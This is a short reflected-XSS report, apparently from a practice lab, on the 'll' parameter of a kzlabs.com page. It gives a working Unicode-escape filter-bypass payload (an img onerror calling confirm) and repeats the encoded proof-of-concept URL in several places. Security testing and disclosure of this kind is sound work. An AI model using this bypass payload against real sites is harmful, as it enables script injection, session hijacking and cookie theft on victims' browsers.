# Reflected Cross-Site Scripting (XSS) via `ll` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `ll` parameter of the application. User-controlled input is reflected into the HTML response without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

The application uses blacklist-based filtering which can be bypassed using Unicode escape sequences.

---

## Vulnerable Endpoint

```text id="u8z3kp"
http://kzlabs.com/punishment/30.php?ll=%3CiMg%20src=x%20onerror=%5Cu0063onfirm?.(1)%3E
```

---

## Vulnerable Parameter

```text id="a4n9tw"
ll
```

---

## Payload Used

```html id="j7v2xd"
<iMg src=x onerror=\u0063onfirm?.(1)>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/punishment/30.php?ll=%3CiMg%20src=x%20onerror=%5Cu0063onfirm?.(1)%3E
   ```

2. Observe that the payload is reflected into the response.

3. The payload bypasses the filter using Unicode encoding.

4. JavaScript executes automatically and triggers a popup dialog.

---

## Proof of Concept

```text id="n5q1rc"
http://kzlabs.com/punishment/30.php?ll=%3CiMg%20src=x%20onerror=%5Cu0063onfirm?.(1)%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/ec55ac74-8ad1-4222-8ccf-c9ebc0b07d63" />


---

## Impact

* Session hijacking
* Cookie theft
* JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Secure rendering
